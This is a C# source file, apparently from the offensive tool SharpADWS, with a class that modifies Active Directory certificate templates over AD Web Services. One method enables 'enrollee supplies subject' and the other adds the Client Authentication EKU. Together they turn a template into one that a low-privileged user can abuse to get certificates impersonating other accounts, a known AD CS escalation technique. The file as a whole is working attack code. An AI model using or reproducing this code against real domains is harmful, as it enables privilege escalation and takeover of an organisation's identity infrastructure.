using SharpADWS.ADWS.Enumeration;
using SharpADWS.ADWS.Transfer;
using SharpADWS.ADWS;
using System;
using System.Collections.Generic;
using System.DirectoryServices.Protocols;
using System.Linq;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading.Tasks;

namespace SharpADWS.Methods.Certify
{
    internal class ModifyCATemplates
    {
        private ADWSConnection adwsConnection = null;
        private string DefaultNamingContext = null;

        public ModifyCATemplates(ADWSConnection adwsConnection)
        {
            this.adwsConnection = adwsConnection;
            this.DefaultNamingContext = adwsConnection.DefaultNamingContext;
        }
        public void EnableEnrolleeSuppliesSubject(string template)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(ObjectClass=pKICertificateTemplate)(cn={template}))", "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration," + this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "msPKI-Certificate-Name-Flag" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] CA Template to enable enrollee supplies subject does not exist!");
                return;
            }

            foreach (ADObject userObject in adObjects)
            {
                if (userObject.Class == "pkicertificatetemplate")
                {
                    PutRequest putRequest = new PutRequest(adwsConnection);
                    Message modifyResponse = putRequest.ModifyRequest(userObject.DistinguishedName, DirectoryAttributeOperation.Replace, "msPKI-Certificate-Name-Flag", (userObject.MsPKICertificateNameFlag | 0x00000001).ToString());

                    if (!modifyResponse.IsFault)
                    {
                        Console.WriteLine($"[*] Enable enrollee supplies subject for template {template} successfully!");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Enable enrollee supplies subject for template {template} failed!");
                    }
                }
            }
        }

        public void EnableClientAuthentication(string template)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(ObjectClass=pKICertificateTemplate)(cn={template}))", "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration," + this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "pKIExtendedKeyUsage" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] CA Template to enable client authentication does not exist!");
                return;
            }

            foreach (ADObject userObject in adObjects)
            {
                if (userObject.Class == "pkicertificatetemplate")
                {
                    PutRequest putRequest = new PutRequest(adwsConnection);
                    Message modifyResponse = putRequest.ModifyRequest(userObject.DistinguishedName, DirectoryAttributeOperation.Add, "pKIExtendedKeyUsage", "1.3.6.1.5.5.7.3.2");

                    if (!modifyResponse.IsFault)
                    {
                        Console.WriteLine($"[*] Enable client authentication for template {template} successfully!");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Enable client authentication for template {template} failed!");
                    }
                }
            }
        }
    }
}
